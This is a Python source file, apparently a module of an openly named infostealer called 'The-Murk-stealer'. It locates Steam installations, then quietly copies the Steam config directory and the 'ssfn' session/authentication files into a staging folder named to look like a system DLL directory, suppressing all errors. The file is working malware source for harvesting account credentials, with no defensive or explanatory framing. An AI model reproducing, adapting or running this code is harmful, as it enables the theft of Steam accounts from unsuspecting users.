#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os
import shutil

"""
all needed paths
"""
path2 = r'C:\Program Files\Steam'
path02 = r'C:\Program Files\Steam\config'
path3 = r'C:\Program Files (x86)\Steam'
path03 = r'C:\Program Files (x86)\Steam\config'

def Steam():
    try:
        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        directory = rf'{pathtofile}\windll\Steam\config'# some new dirs
        directory2 = rf'{pathtofile}\windll\Steam'
        files2 = [i for i in os.listdir(path2) if os.path.isfile(os.path.join(path2,i)) and \
         'ssfn' in i]
        shutil.copytree(path02, directory)# copy dir
        shutil.copy(path2+'\\'+files2[0], directory2)# copy files
        shutil.copy(path2+'\\'+files2[1], directory2)
    except:
        pass
    try:
        files3 = [i for i in os.listdir(path3) if os.path.isfile(os.path.join(path3,i)) and \
         'ssfn' in i]
        shutil.copytree(path03, directory)
        shutil.copy(path3+'\\'+files3[0], directory2)# copy files
        shutil.copy(path3+'\\'+files3[1], directory2)
    except:
        pass

